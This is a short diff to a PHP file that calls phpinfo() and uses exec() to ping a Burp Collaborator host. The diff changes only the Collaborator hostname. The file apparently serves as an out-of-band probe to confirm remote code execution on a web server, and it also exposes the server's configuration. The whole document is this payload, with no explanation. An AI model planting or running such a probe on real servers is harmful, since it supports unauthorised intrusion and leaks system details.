@@ -1,5 +1,5 @@
 <?php
 phpinfo();
 
-exec('ping 8x6we4irzia585e27wcvilnualgp4e.burpcollaborator.net');
+exec('ping etbha0888wu917llzz7kvl1medk68v.burpcollaborator.net');
 ?>
